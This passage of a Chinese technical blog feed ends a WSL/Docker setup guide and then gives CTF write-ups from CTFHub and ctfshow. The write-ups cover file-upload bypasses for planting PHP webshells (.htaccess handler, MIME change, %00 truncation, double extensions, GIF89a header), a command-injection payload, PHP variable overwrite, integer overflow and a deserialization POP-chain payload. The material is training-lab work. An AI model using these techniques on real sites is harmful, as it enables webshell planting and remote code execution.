--unregister Ubuntu-22.04</span><br></pre></td></tr></table></figure><p>再通过“wsl -l -v”，发现子系统已删除</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/28344286-d2fb4376a29eb1df.png" alt="img"></p><h4 id="④导入镜像">④导入镜像</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --import Ubuntu-22.04 D:\Ubuntu2004 D:\ubuntu20.04.tar </span><br></pre></td></tr></table></figure><p>Ubuntu-22.04    Linux系统名称和版本<br>D:\Ubuntu2204  安装路径<br>D:\ubuntu22.04.tar 镜像所在位置<br>等待系统处理，在文件夹中看到vhdx文件即为导入成功</p><h4 id="⑤配置先前设置的默认登录用户">⑤配置先前设置的默认登录用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu2204.exe config --default-user username</span><br></pre></td></tr></table></figure><p>username替换成你先前输入的账户名，可以替换为root<br>至此ubuntu22.04迁移完成~！</p><h2 id="三、配置docker和docker-compose">三、配置docker和docker-compose</h2><h3 id="Wsl2中的Ubuntu22-04安装Docker">Wsl2中的Ubuntu22.04安装Docker</h3><blockquote><p>友情提示：确定为wsl2+ubuntu22.04，否则可能按照以下步骤会失败。若失败，请完全卸载后重装docker，并检查wsl版本</p></blockquote><p>安装依赖包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apt-transport-https ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure><p>添加阿里云镜像源和密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure><p>添加阿里云镜像源和密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure><p>添加阿里云镜像源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure><p>从软件源中更新安装工具包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt uograde</span><br></pre></td></tr></table></figure><p>安装Docker套件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>安装docker-compose</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure><p>验证安装是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker --version</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241114130614313.png" alt="image-20241114130614313"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><p>启动docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><h3 id="docker指令必须用sudo执行">docker指令必须用sudo执行</h3><p>默认情况下， Unix 套接字 (Unix socket)由用户 root 拥有，其他用户只能使用 sudo 访问它。 Docker 守护进程始终以 root 用户身份运行。</p><p>为了避免每次都加sudo，需要给现在的账户添加docker权限</p><p>创建Docker用户组</p><p>通常在安装 Docker 时会自动创建一个名为 docker 的用户组，但可以手动确保其存在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker</span><br></pre></td></tr></table></figure><p>将当前用户添加到docker 组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker $USER</span><br></pre></td></tr></table></figure><h3 id="配置Docker镜像源">配置Docker镜像源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.创建Docker文件夹</span><br><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">2.写入个人镜像源</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://ud6340vz.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">3.重启守护进程和docker引擎</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>测试镜像源配置成功</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull hello-world</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/02162cf0dc8f48ad944b284e0c5cca0d.png" alt="img"></p><p>其他镜像源加速地址:</p><p>Docker 中国官方镜像<a href="https://registry.docker-cn.com">https://registry.docker-cn.com</a><br>DaoCloud 镜像站<a href="http://f1361db2.m.daocloud.io">http://f1361db2.m.daocloud.io</a><br>Azure 中国镜像<a href="https://dockerhub.azk8s.cn">https://dockerhub.azk8s.cn</a><br>科大镜像站<a href="https://docker.mirrors.ustc.edu.cn">https://docker.mirrors.ustc.edu.cn</a><br>阿里云<a href="https://ud6340vz.mirror.aliyuncs.com">https://ud6340vz.mirror.aliyuncs.com</a><br>七牛云<a href="https://reg-mirror.qiniu.com">https://reg-mirror.qiniu.com</a><br>网易云(常用)<a href="https://hub-mirror.c.163.com">https://hub-mirror.c.163.com</a><br>腾讯云<a href="https://mirror.ccs.tencentyun.com">https://mirror.ccs.tencentyun.com</a></p><h2 id="四、docker-pull-报错Get-“https-registry-1-docker-io-v2-”-net-http-request-canceled-while-waiting-for-connection-Client-Timeout-exceeded-while-awaiting-headers-解决方法">四、docker pull 报错Get “<a href="https://registry-1.docker.io/v2/">https://registry-1.docker.io/v2/</a>”: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)解决方法</h2><p>配置加速地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>添加以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://docker.1panel.live&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [</span><br><span class="line">            &quot;https://docker.211678.top&quot;,</span><br><span class="line">            &quot;https://docker.1panel.live&quot;,</span><br><span class="line">            &quot;https://hub.rat.dev&quot;,</span><br><span class="line">            &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="line">            &quot;https://do.nark.eu.org&quot;,</span><br><span class="line">            &quot;https://dockerpull.com&quot;,</span><br><span class="line">            &quot;https://dockerproxy.cn&quot;,</span><br><span class="line">            &quot;https://docker.awsl9527.cn&quot;</span><br><span class="line">      ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://docker.m.daocloud.io&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:wq</span><br></pre></td></tr></table></figure><p>重启docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart  docker</span><br></pre></td></tr></table></figure><h2 id="五、Docker关闭不掉进程，Stopping-docker-service-but-it-can-still-be-activated-by-docker-socket">五、Docker关闭不掉进程，Stopping docker.service, but it can still be activated by: docker.socket</h2><p>解决方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker stop</span><br><span class="line"></span><br><span class="line">systemctl stop docker.socket</span><br></pre></td></tr></table></figure><p><strong>注意：1. 关闭终端重启会解决大部分问题。</strong></p><p><strong>2. 还有以下部分是权限问题，用sudo su切换成root模式</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub技能树-文件上传</title>
      <link href="/posts/2f3e3730.html"/>
      <url>/posts/2f3e3730.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="文件上传">文件上传</h2><blockquote><p>来源：CTFHub技能树</p></blockquote><h4 id="无验证">无验证</h4><blockquote><p>直接上传一句话木马，会显示路径，直接蚁剑连接找到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112713829.png" alt="image-20241109112713829"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112741306.png" alt="image-20241109112741306"></p><h4 id="前端验证">前端验证</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112850962.png" alt="image-20241109112850962"></p><blockquote><p>查看源代码，发现进行了前端验证，必须是jpg,png或者gif文件。</p><p>直接抓包改包发送绕过</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109113155795.png" alt="image-20241109113155795"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109113230322.png" alt="image-20241109113230322"></p><blockquote><p>上传成功，直接蚁剑连接找flag就行。</p></blockquote><h4 id="htaccess">.htaccess</h4><blockquote><p>知识：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p></blockquote><blockquote><p>介绍：hatccess文件，.htaccess是Apache的又一特色。<br>● 一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件），<br>● 提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<br>● 作为用户，所能使用的命令受到限制。<br>● 简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p></blockquote><blockquote><p>所以先创建一个 .htaccess的文件，里面输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;pass777&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>表示文件名中包含pass777的文件都会被当作php执行</p><p>所以再写一个一句话木马，文件名中包含pass777，上传后用蚁剑连接就能拿到flag</p></blockquote><blockquote><p>ctfhub{2428d2cef017f7d0e902eaac}</p></blockquote><h4 id="MIME绕过">MIME绕过</h4><blockquote><p>直接将一句话木马后缀改成jpg，然后抓包修改成php，蚁剑连接就能拿到</p><p>ctfhub{c76881cacfd16db8afee74fd}</p></blockquote><h4 id="00截断">00截断</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120203556473.png" alt="image-20241120203556473"></p><blockquote><p>根据前端提示，发现上传类型限制成了jpg,png,gif文件，并且如果文件类型被允许，构造目标路径（<code>$des</code>），该路径由<code>$_GET['road']</code>（从URL的查询字符串中获取），一个随机数（10到99之间），当前日期和时间（格式为<code>YmdHis</code>），以及文件扩展名组成，并使用<code>move_uploaded_file()</code>函数将上传的文件从临时目录移动到目标目录（<code>$des</code>）</p><p>所以在路径处修改成.php的路径，然后用%00截断，让后面添加的目录失效</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120204749984.png" alt="image-20241120204749984"></p><blockquote><p>由于我们修改了路径，所以保存路径就是原来的/upload/yjh-cmd.php</p><p><a href="http://xn--challenge-a074b1b840a3ecbe-uw57b2z5yej5jvy6b.sandbox.ctfhub.com:10800/upload/123.php">蚁剑连接challenge-a074b1b840a3ecbe.sandbox.ctfhub.com:10800/upload/123.php</a></p><p>ctfhub{e158c8b8eb6fdb23553ce830}</p></blockquote><h4 id="双写后缀">双写后缀</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);</span><br><span class="line">$name = str_ireplace($blacklist, &quot;&quot;, $name);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><blockquote><p>看提示发现过滤了一系列后缀，然后会把后缀替换成无，所以双写绕过,如：yjh.pphphp</p><p>ctfhub{a0a5473d07fac34189262488}</p></blockquote><h4 id="文件头检查">文件头检查</h4><blockquote><p>先随便上传一个文件，然后有提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120211213870.png" alt="image-20241120211213870"></p><blockquote><p>那就抓包修改文件类型,同时在一句话木马前加上GIF89a,用来表示这是一个图片</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120211402688.png" alt="image-20241120211402688"></p><blockquote><p>蚁剑连接得到flag</p><p>ctfhub{5602bccd8ab06a8c2408fb81}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow刷题</title>
      <link href="/posts/7acd7e04.html"/>
      <url>/posts/7acd7e04.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>来源：ctfshow</p><h4 id="easyPytHon-P">easyPytHon_P</h4><blockquote><p>考点：代码审计，源代码查看</p></blockquote><blockquote><p>打开后查看源码，发现一个源码地址，打开看看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150901508.png" alt="image-20241109150901508"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150915342.png" alt="image-20241109150915342"></p><blockquote><p>可以知道在此目录下有个flag.txt文件，再观察源码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line">cmd: str = request.form.get(&#x27;cmd&#x27;)</span><br><span class="line">param: str = request.form.get(&#x27;param&#x27;)</span><br><span class="line"># ------------------------------------- Don&#x27;t modify ↑ them ↑! But you can write your code ↓</span><br><span class="line">import subprocess, os</span><br><span class="line">if cmd is not None and param is not None:</span><br><span class="line">    try:</span><br><span class="line">        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)</span><br><span class="line">        print(&#x27;Done!&#x27;)</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        print(&#x27;Timeout!&#x27;)</span><br><span class="line">    except:</span><br><span class="line">        print(&#x27;Error!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;No Flag!&#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>发现传入两个参数cmd和param，会截取cmd的前三个字符当成命令run，param被当成参数。</p><p>所以直接构造cat flag.txt</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=cat&amp;param=flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150800375.png" alt="image-20241109150800375"></p><blockquote><p>ctfshow{7d9cfcf5-9314-4eb0-9240-d77a6ca6f29d}</p></blockquote><h4 id="遍地飘零">遍地飘零</h4><blockquote><p>考点：$$值覆盖，$_GET全局变量和本地变量</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class="line">    echo &quot;好多零&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;没有零，仔细看看输入有什么问题吧&quot;;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>分析代码可知，get传参的参数名会传给key，将key的值传给变量value。</p><p>然后进行变量值覆盖，将key的值当作变量名，将value的值也当作变量名，且赋值前者为后者。</p><p>例如：传递参数 ?get=aa，则$key=get,$value=$key=aa，</p><p>值覆盖时，$$key=$get，$$value=$aa</p><p>所以，目标是执行var_dump($flag)</p><p>构造payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_GET=flag</span><br></pre></td></tr></table></figure><blockquote><p>传进去时，$key=_GET,$value=flag，再进行值覆盖，就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET=$flag</span><br></pre></td></tr></table></figure><p>从而实现目标，得到flag</p><p>ctfshow{2fe8eb61-9f07-4713-a7f2-311a3e4786d3}</p></blockquote><h4 id="茶歇区">茶歇区</h4><blockquote><p>考点：多次整数溢出</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160125845.png" alt="image-20241109160125845"></p><blockquote><p>先查看源码，找不到相关函数和score等计分的变量，所以不能通过控制台改代码了。</p><p>看到全是整数，想到整数溢出。先输入99999999999999999999</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160320364.png" alt="image-20241109160320364"></p><blockquote><p>9223372036854775807</p><p>999999999999999999</p><p>输入999999999999999999，不断重复，直到出现flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160421972.png" alt="image-20241109160421972"></p><blockquote><p>ctfshow{b31d09fc-4022-49ca-ad7d-ea533f98cdc2}</p></blockquote><h4 id="小舔田？">小舔田？</h4><blockquote><p>考点：序列化构造pop链</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Moon&#123;</span><br><span class="line">    public $name=&quot;月亮&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;我是&quot;.$this-&gt;name.&quot;快来赏我&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public $nickname=&quot;牛夫人&quot;;</span><br><span class="line"></span><br><span class="line">    public function call()&#123;</span><br><span class="line">        global $flag;</span><br><span class="line">        if ($this-&gt;nickname==&quot;小甜甜&quot;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;.$this-&gt;nickname.&quot;。\n&quot;;</span><br><span class="line">            echo &quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;call();</span><br><span class="line">        return &quot;\t\t\t\t\t\t\t\t\t\t----&quot;.$this-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;code&#x27;]);</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $a=new Ion_Fan_Princess();</span><br><span class="line">    echo $a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>进行代码审计，发现是个序列化题，有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()和__wakeup()</span><br></pre></td></tr></table></figure><p>构造一条pop链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call() &lt;- Ion_Fan_Princess:__toString() &lt;- Moon:__wakeup()</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Moon&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;我是&quot;.$this-&gt;name.&quot;快来赏我&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public $nickname=&quot;小甜甜&quot;;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;call();</span><br><span class="line">        return &quot;\t\t\t\t\t\t\t\t\t\t----&quot;.$this-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Moon();</span><br><span class="line">$a-&gt;name = new Ion_Fan_Princess();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">//O%3A4%3A%22Moon%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A16%3A%22Ion_Fan_Princess%22%3A1%3A%7Bs%3A8%3A%22nickname%22%3Bs%3A9%3A%22%E5%B0%8F%E7%94%9C%E7%94%9C%22%3B%7D%7D</span><br></pre></td></tr></table></figure><blockquote><p>ctfshow{ab725e26-0530-4535-8cb5-517419dccb8b}</p></blockquote><h4 id="LSB探姬">LSB探姬</h4><blockquote><p>考点：文件名中的命令执行</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109165919952.png" alt="image-20241109165919952"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># File       : app.py</span><br><span class="line"># Time       ：2022/10/20 15:16</span><br><span class="line"># Author     ：g4_simon</span><br><span class="line"># version    ：python 3.9.7</span><br><span class="line"># Description：TSTEG-WEB</span><br><span class="line"># flag is in /app/flag.py</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">#初始化全局变量</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():    </span><br><span class="line">    return render_template(&#x27;upload.html&#x27;)</span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        try:</span><br><span class="line">            f = request.files[&#x27;file&#x27;]</span><br><span class="line">            f.save(&#x27;upload/&#x27;+f.filename)</span><br><span class="line">            cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span 